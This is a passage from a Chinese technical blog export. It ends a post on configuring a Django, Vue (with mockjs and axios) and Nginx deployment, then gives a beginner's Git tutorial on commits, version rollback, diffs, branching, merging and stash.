<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DJANGO_API = os.getenv(<span class="string">&#x27;DJANGO_API&#x27;</span>)</span><br><span class="line">DJANGO_DATABASE = os.getenv(<span class="string">&#x27;DJANGO_DATABASE&#x27;</span>)</span><br><span class="line">DJANGO_DATABASE_HOST = os.getenv(<span class="string">&#x27;DJANGO_DATABASE_HOST&#x27;</span>)</span><br><span class="line">DJANGO_DATABASE_PORT = os.getenv(<span class="string">&#x27;DJANGO_DATABASE_PORT&#x27;</span>)</span><br><span class="line">DJANGO_DATABASE_PSWD = os.getenv(<span class="string">&#x27;DJANGO_DATABASE_PSWD&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><h4 id="配置Vue-Cli开发环境与生产环境文件"><a href="#配置Vue-Cli开发环境与生产环境文件" class="headerlink" title="配置Vue Cli开发环境与生产环境文件"></a>配置Vue Cli开发环境与生产环境文件</h4><p>创建<code>.env.production</code>和<code>.env.development</code>，用于存放两种环境下的配置参数。</p>
<p><code>.env.production</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">NODE_ENV = <span class="string">&#x27;development&#x27;</span></span><br><span class="line">VUE_APP_MODE = <span class="string">&#x27;development&#x27;</span></span><br><span class="line">VUE_APP_API_URL = <span class="string">&#x27;http://127.0.0.1:8000/&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>.env.development</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">NODE_ENV = <span class="string">&#x27;production&#x27;</span></span><br><span class="line">VUE_APP_MODE = <span class="string">&#x27;production&#x27;</span></span><br><span class="line">VUE_APP_API_URL = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在Js文件中，通过下面的方式可以区分两种运行环境。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> mode = process.<span class="property">env</span>.<span class="property">VUE_APP_MODE</span></span><br></pre></td></tr></table></figure>

<h4 id="虚拟后端"><a href="#虚拟后端" class="headerlink" title="虚拟后端"></a>虚拟后端</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i axios </span><br><span class="line">npm i mockjs</span><br></pre></td></tr></table></figure>

<p>通过配置Mock可以实现模拟后端反馈数据。<br>首先配置axios模块，实现请求和响应拦截。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">headers</span>.<span class="property">get</span>[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">VUE_APP_MODE</span> == <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 请求拦截器</span></span><br><span class="line">    axios.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> token = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;userToken&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (token) &#123; <span class="comment">// 判断是否存在token，如果存在的话，则每个http header都加上token</span></span><br><span class="line">                config.<span class="property">headers</span>.<span class="property">accessToken</span> = token;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> config;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="comment">// 响应拦截器</span></span><br><span class="line">    axios.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> response;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> axios</span><br></pre></td></tr></table></figure>

<p>创建<code>mock.js</code>文件，编写模拟后端接口。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* eslint-disable no-unused-vars */</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Mock</span> <span class="keyword">from</span> <span class="string">&#x27;mockjs&#x27;</span>;</span><br><span class="line"><span class="comment">// 配置拦截 ajax 的请求时的行为，支持的配置项目有 timeout。</span></span><br><span class="line"><span class="title class_">Mock</span>.<span class="title function_">setup</span>(&#123;</span><br><span class="line">    <span class="attr">timeout</span>: <span class="string">&#x27;200 - 300&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// const vCode = &#x27;123456&#x27;;</span></span><br><span class="line"><span class="comment">// function getVerificatCode(prarms) &#123;</span></span><br><span class="line"><span class="comment">//     const prarmsObj = JSON.parse(prarms.body);</span></span><br><span class="line"><span class="comment">//     return Object.assign(prarmsObj, &#123; vCode: vCode &#125;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// function loginFun(prarms) &#123;</span></span><br><span class="line"><span class="comment">//     const prarmsObj = JSON.parse(prarms.body);</span></span><br><span class="line"><span class="comment">//     if (prarmsObj.code === vCode) &#123;</span></span><br><span class="line"><span class="comment">//         return &#123; code: 1, text: &#x27;登录成功&#x27; &#125;</span></span><br><span class="line"><span class="comment">//     &#125; else &#123;</span></span><br><span class="line"><span class="comment">//         return &#123; code: 2, text: &#x27;验证码有误，登录失败&#x27; &#125;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> raw_device_list = &#123;</span><br><span class="line">    <span class="attr">device_list</span>: [</span><br><span class="line">        &#123; <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1001&quot;</span>, <span class="string">&quot;ip&quot;</span>: <span class="string">&#x27;192.168.3.101&#x27;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;auto&quot;</span>: <span class="literal">true</span>, <span class="string">&#x27;comment&#x27;</span>: <span class="string">&#x27;院子里那个&#x27;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1002&quot;</span>, <span class="string">&quot;ip&quot;</span>: <span class="string">&#x27;192.168.3.102&#x27;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;auto&quot;</span>: <span class="literal">true</span>, <span class="string">&#x27;comment&#x27;</span>: <span class="string">&#x27;屋子里那个&#x27;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;id&quot;</span>: <span class="string">&quot;2004&quot;</span>, <span class="string">&quot;ip&quot;</span>: <span class="string">&#x27;192.168.3.123&#x27;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;auto&quot;</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;id&quot;</span>: <span class="string">&quot;3002&quot;</span>, <span class="string">&quot;ip&quot;</span>: <span class="string">&#x27;192.168.3.132&#x27;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;auto&quot;</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> raw_device_data = &#123;</span><br><span class="line">    <span class="string">&#x27;1001&#x27;</span>: [</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T11:11:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">10</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T11:12:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">20</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T12:13:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">30</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;1002&#x27;</span>: [</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T13:11:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">10</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T13:12:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">40</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">time</span>: <span class="string">&#x27;2020-06-09T13:13:03.841&#x27;</span>, <span class="attr">value</span>: <span class="number">20</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">device_list</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// const prarmsObj = JSON.parse(prarms.body);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> raw_device_list</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">device_add</span>(<span class="params">param</span>) &#123;</span><br><span class="line">    <span class="comment">// eslint-disable-next-line no-unused-vars</span></span><br><span class="line">    <span class="keyword">const</span> paramObj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(param.<span class="property">body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(paramObj)</span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">VUE_APP_MODE</span> == <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Mock.mock( url, post/get , 返回的数据)；</span></span><br><span class="line">    <span class="title class_">Mock</span>.<span class="title function_">mock</span>(<span class="string">&#x27;/api/device/list&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, device_list);</span><br><span class="line">    <span class="title class_">Mock</span>.<span class="title function_">mock</span>(<span class="string">&#x27;/api/device/add&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, device_add);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BootstrapVue</span>, <span class="title class_">IconsPlugin</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;bootstrap-vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Video</span> <span class="keyword">from</span> <span class="string">&#x27;video.js&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;./axios/axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;bootstrap/dist/css/bootstrap.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;bootstrap-vue/dist/bootstrap-vue.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;video.js/dist/video-js.css&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./mocks/mock.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">BootstrapVue</span>)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">IconsPlugin</span>)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$video</span> = <span class="title class_">Video</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">axios</span> = axios</span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    router,</span><br><span class="line">    store,</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>配置Nginx，用于耦合前后端程序。为了防止出现跨域，可以通过反向代理设置后端到前端接口上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#user nobody;</span><br><span class="line">worker_processes 1;</span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">	include mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line">	sendfile on;</span><br><span class="line">	#tcp_nopush on;</span><br><span class="line">	#keepalive_timeout 0;</span><br><span class="line">	keepalive_timeout 65;</span><br><span class="line">	#gzip on;</span><br><span class="line">	gzip on;</span><br><span class="line">	gzip_min_length 5k;</span><br><span class="line">	gzip_buffers 4 16k;</span><br><span class="line">	#gzip_http_version 1.0;</span><br><span class="line">	gzip_comp_level 3;</span><br><span class="line">	gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;</span><br><span class="line">	gzip_vary on;</span><br><span class="line">	server &#123;</span><br><span class="line">		listen 80;</span><br><span class="line">		server_name nginx;</span><br><span class="line">		# 前端</span><br><span class="line">		location / &#123;</span><br><span class="line">			index index.html index.htm; #添加属性。</span><br><span class="line">			root /usr/share/nginx/html; #站点目录</span><br><span class="line">		&#125;</span><br><span class="line">		# 后端，反向代理</span><br><span class="line">		location /api/ &#123;</span><br><span class="line">			proxy_pass http://django:8000/;</span><br><span class="line">		&#125;</span><br><span class="line">		error_page 500 502 503 504 /50x.html;</span><br><span class="line">		location = /50x.html &#123;</span><br><span class="line">			root /usr/share/nginx/html;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
        <tag>VS Code &amp; C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/2020/01/17/%E8%BF%90%E7%BB%B4/Git/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="Git-的介绍与安装"><a href="#Git-的介绍与安装" class="headerlink" title="Git 的介绍与安装"></a>Git 的介绍与安装</h2><p>Git具有版本控制与合作开发的特点。它是一个分布式的版本控制系统，代码不仅在服务器上保存代码的完整版，还在各个客户端保存完整代码的副本。这个服务器可以是Github，也可以是自己搭建的代码管理系统，如Gitlab，码云等。</p>
<p><a href="https://git-scm.com/downloads">点击进入Git下载页面</a>。</p>
<h2 id="GIT的基本结构"><a href="#GIT的基本结构" class="headerlink" title="GIT的基本结构"></a>GIT的基本结构</h2><img src="/2020/01/17/%E8%BF%90%E7%BB%B4/Git/git_struct.jpg" class="" title="Git基本结构">

<h3 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h3><p>工作区就是当前的Git目录。</p>
<h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>版本库就是该目录下的<code>.git</code>目录。</p>
<h3 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h3><p>暂存区就是用户执行<code>add</code>操作后，临时修改被放置的位置。暂存区的文件经过<code>commit</code>命令可以被提交到分支中（创建一个版本）。</p>
<h2 id="GIT本地仓库的基本操作"><a href="#GIT本地仓库的基本操作" class="headerlink" title="GIT本地仓库的基本操作"></a>GIT本地仓库的基本操作</h2><p>本节将介绍：Git仓库的初始化，版本切换，版本日志的查看，工作区修改情况查看，撤销等命令，命令如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init resp_name         <span class="comment"># 代码仓库初始化</span></span><br><span class="line">git add .                  <span class="comment"># 添加所有改动到暂存区</span></span><br><span class="line">git commit -m <span class="string">&quot;...&quot;</span>        <span class="comment"># 提交暂存区内容，形成版本</span></span><br><span class="line">git <span class="built_in">log</span>                    <span class="comment"># 打印当前版本库</span></span><br><span class="line">git reflog                 <span class="comment"># 打印操作记录</span></span><br><span class="line">git reset --hard HEAD^     <span class="comment"># 切换到上上个版本</span></span><br><span class="line">git checkout -- file_name  <span class="comment"># 将暂存区的文件恢复到工作区（丢弃工作区的改动）</span></span><br><span class="line">git reset HEAD file_name   <span class="comment"># 将版本库中的文件恢复到暂存区</span></span><br><span class="line">git diff HEAD -- file_name <span class="comment"># 对比工作区文件与版本库文件的区别</span></span><br><span class="line">git diff HEAD HEAD^ -- file_name  <span class="comment"># 对比两个版本的某文件的区别</span></span><br></pre></td></tr></table></figure>

<h3 id="本地仓库的创建与提交"><a href="#本地仓库的创建与提交" class="headerlink" title="本地仓库的创建与提交"></a>本地仓库的创建与提交</h3><p>新建一个目录，之后我们要在这里开发一个项目（编写代码）。首先使用<code>Git Bash</code>在该目录下执行，初始化一个Git仓库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init repository_name</span><br></pre></td></tr></table></figure>

<p>完毕后，Git将创建一个版本控制系统在该目录下。之后我们创建一个文件，简单的编写一些内容，用于验证后面的版本控制的功能。例如，我们创建一个<code>code.txt</code>文件。内容如下：</p>
<p><code>code.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></table></figure>

<p>保存退出，在<code>Git Bash</code>中执行以下命令，添加修改到工作区，并提交修改：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git add . </span><br><span class="line">git commit -m <span class="string">&#x27;新增并初始化了code.txt文件&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里的<code>.</code>表示该目录下的所有文件，也可以写某一个文件，还可以使用<code>*.txt</code>等格式书写；<code>add</code>操作表示将相应文件加入到版本控制系统中；<code>commit</code>命令表示提交修改，<code>-m</code>的参数表示相应的备注。</p>
<h3 id="版本的切换"><a href="#版本的切换" class="headerlink" title="版本的切换"></a>版本的切换</h3><p>输入如下命令，可以查看当前所有的代码版本。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<p>或使log以简短形式呈现</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline</span><br><span class="line">git <span class="built_in">log</span> --graph --pretty=oneline <span class="comment"># 含有图形展示</span></span><br></pre></td></tr></table></figure>


<p>下面我们创建第二个版本。修改刚刚的<code>code.txt</code>文件，内容如下</p>
<p><code>code.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure>

<p>再次执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git add . </span><br><span class="line">git commit -m <span class="string">&#x27;修改了code.txt文件内容&#x27;</span></span><br></pre></td></tr></table></figure>

<p>则我们添加了一个新的版本到我们的版本库中。执行<code>git log</code>即可查看到两个版本。</p>
<img src="/2020/01/17/%E8%BF%90%E7%BB%B4/Git/git_log_versions.jpg" class="" title="两个版本">
<p>图中的commit 后的 1f96fe…  与 2f88a26… 则是对应的两个版本的版本代号。</p>
<p>那么如何回退到某一个版本？Git的版本是后一个版本依赖于前一个版本的，也就是后面的版本只记录修改的部分。所有的版本组成了一个链表，而<code>HEAD</code>指针永远指向的最新的版本。如果想找到上一个版本，可以使用<code>HEAD^</code>或<code>HEAD~1</code>；上两个版本，可以使用<code>HEAD^^</code>或<code>HEAD~2</code>。</p>
<p>Tips：HEAD实际上会指向master，而master才指向最新的版本。关于分支的部分可以到下一节查看。这里可以暂时理解为HEAD指向最新的版本。</p>
<p>回退到上一个版本，可以使用命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>打开文件<code>code.txt</code>可以看到，文件内容已经恢复到最初的版本了。<br>如果又想切换到最新的版本，则可以使用命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git reset --hard 版本编号</span><br></pre></td></tr></table></figure>

<p>版本编号可以使用<code>git reflog</code>命令，通过查看操作记录寻找版本编号。</p>
<h3 id="恢复工作区的文件"><a href="#恢复工作区的文件" class="headerlink" title="恢复工作区的文件"></a>恢复工作区的文件</h3><p>当工作区被编辑后，如果不知道已经做过哪些修改了，可以通过下面的命令查看当前工作区被修改的情况。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<p>如果想撤销工作区中某一个文件的修改，可以使用如下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout -- 文件名</span><br></pre></td></tr></table></figure>

<p>如果想撤销暂存区中某一个文件的修改，可以使用如下命令，使修改回归暂存区。回归暂存区后，再使用<code>checkout</code>命令使其回到工作区。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git reset HEAD 文件名</span><br></pre></td></tr></table></figure>

<h3 id="如何对比文件与文件的不同？"><a href="#如何对比文件与文件的不同？" class="headerlink" title="如何对比文件与文件的不同？"></a>如何对比文件与文件的不同？</h3><ol>
<li><p>对比工作区与版本库中的文件的不同：<br>使用diff命令，需要给出被对比的版本和文件名。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git diff HEAD -- 文件名</span><br></pre></td></tr></table></figure>
<p>会输出</p>
<img src="/2020/01/17/%E8%BF%90%E7%BB%B4/Git/git_diff.jpg" class="" title="Git diff 结果">
<p>其中的<code>---</code>表示版本库中的文件，<code>+++</code>表示工作区中的文件。下方的红色部分表示工作区中的文件相对于版本库删掉的部分，绿色的是添加的部分。</p>
</li>
<li><p>对比版本库中两个版本的文件的不同：<br>使用diff命令，并给出被对比的两个版本和文件名。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git diff HEAD HEAD^ -- 文件名</span><br></pre></td></tr></table></figure>
<p>这里输出的时候，<code>---</code>表示版本库中的<code>HEAD</code>版本，<code>+++</code>表示<code>HEAD^</code>版本。如果命令写成<code>git diff HEAD^ HEAD</code>，则<code>---</code>与<code>+++</code>所表示的内容也相反。</p>
</li>
</ol>
<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>如果想删除某一个文件，并将这一改动添加到暂存区，可以使用<code>git add</code>命令，表示添加改动到暂存区；也可以使用<code>git rm</code>命令，表示添加删除操作到暂存区。示例如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> 文件名</span><br></pre></td></tr></table></figure>

<h2 id="Git-的分支管理"><a href="#Git-的分支管理" class="headerlink" title="Git 的分支管理"></a>Git 的分支管理</h2><p>在Git中，所谓分支就是一个指针。例如master分支，就是一个master指针指向了该版本链表的某一个节点。如果是其他分支，例如dev分支，则是在这个链表上添加一个叫dev的指针，指向某一个版本节点。最终再由HEAD指针指向当前编辑的分支指针，也就是HEAD指向了当前编辑的分支。</p>
<img src="/2020/01/17/%E8%BF%90%E7%BB%B4/Git/git_tree.jpg" class="" title="Git分支">

<p>分支的合并，就是将master指针指向dev所指节点，即图中第四个节点。这样就将dev分支合并到master分支当中了。</p>
<p>分支的删除，就是直接删除dev指针，这样就删掉了该分支。</p>
<p>分支的基本操作如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch           <span class="comment"># 查看所有分支</span></span><br><span class="line">git branch dev       <span class="comment"># 创建dev分支</span></span><br><span class="line">git branch -d dev    <span class="comment"># 删除dev分支</span></span><br><span class="line">git checkout master  <span class="comment"># 切换到master分支</span></span><br><span class="line">git checkout -b dev  <span class="comment"># 创建并切换到dev分支</span></span><br><span class="line">git merge dev        <span class="comment"># 合并dev分支到当前分支</span></span><br><span class="line">git stash            <span class="comment"># 临时存储工作区</span></span><br><span class="line">git stash list       <span class="comment"># 列出所有的工作区</span></span><br><span class="line">git stash pop        <span class="comment"># 恢复顶层的工作区</span></span><br></pre></td></tr></table></figure>

<h3 id="分支的查看，创建与切换"><a href="#分支的查看，创建与切换" class="headerlink" title="分支的查看，创建与切换"></a>分支的查看，创建与切换</h3><p>使用下述命令，可以查看当前的所有分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure>

<p>如果要创建某一分支，可以使用这个命令（dev为分支名称）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch dev</span><br></pre></td></tr></table></figure>

<p>进行分支切换，可以直接使用如下命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure>

<p>或创建并切换分支，可以一步到位，使用这个命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout -b dev</span><br></pre></td></tr></table></figure>

<p>切换的过程，就是由HEAD指向master指针变为了HEAD指向dev指针。新建的分支保留了原有分支的所有版本，也就是版本链表前边的部分，dev与master是共同享有的。这时，我们不论是<code>add</code>与<code>commit</code>操作，还是<code>log</code>操作，均是在dev分支上进行的。</p>
<h3 id="分支的合并与分支管理"><a href="#分支的合并与分支管理" class="headerlink" title="分支的合并与分支管理"></a>分支的合并与分支管理</h3><p>当要进行分支合并，使用如下命令，但是分支合并，必须要在被合并的分支上进行，例如要将dev分支合并到master上，需要先切换到master分支上再执行合并操作。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git merge dev</span><br></pre></td></tr></table></figure>

<p>合并分为三种情况：有冲突的合并；没有冲突的快速合并；没有冲突的普通合并。</p>
<ul>
<li>快速合并：只修改新的分支，原有分支不动。例如master指针可以直接指向dev指针的位置上，无需产生新的版本，也不会留下分支创建的记录。</li>
<li>没有冲突的普通合并（recursive合并）：两个分支上都有新版本产生，但是没有修改同一个文件。这种情况会在合并后产生一个新的版本。在执行合并操作后会提示提交新版本需要填写的信息。</li>
<li>有冲突的合并：两个分支上都有新版本产生，且修改了同一个文件。这会在合并后先产生合并失败，需要待手动修改冲突后再手动提交新的版本。</li>
</ul>
<p>对于有冲突的合并，合并失败后，有冲突的文件会产生类似于如下内容的部分。通过手动修改这部分的内容，可以解决合并冲突。修改后，再次执行<code>add</code>与<code>commit</code>操作即可完成合并。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt; HEAD   # 删除多余部分，保留需要的部分</span><br><span class="line">原分支的更改（被合并的分支）</span><br><span class="line">========</span><br><span class="line">新传入的更改</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; dev</span><br></pre></td></tr></table></figure>

<p>有时为了保留分支的创建与合并的记录，我们会在合并时候禁用快速合并模式。执行方式如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m <span class="string">&quot;提交信息&quot;</span> dev</span><br></pre></td></tr></table></figure>

<p>合并后，就可以删除dev分支了。这里使用如下命令删除dev分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch -d dev</span><br></pre></td></tr></table></figure>

<h3 id="Bug-分支与-stash-功能"><a href="#Bug-分支与-stash-功能" class="headerlink" title="Bug 分支与 stash 功能"></a>Bug 分支与 stash 功能</h3><p>当我们遇到紧急Bug需要修复时，但又不能将当前的工作区提交到版本控制系统中，就可以使用stash功能。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure>

<p>stash功能可以将我们的工作区临时存储起来，存储完成后，工作区恢复到最近版本，就可以先去完成修复Bug的工作了。</p>
<p>修复bug时，首先创建bug分支，其次完成bug修复工作，完成后将bug分支合并到master分支即可。</p>
<p>待完成修复Bug的工作后，再去将我们原来的工作区恢复，继续进行工作。使用如下命令可以看到我们保存的所有的工作现场。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git stash list</span><br></pre></td></tr></table></figure>

<p>使用如下命令可以恢复工作现场。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure>

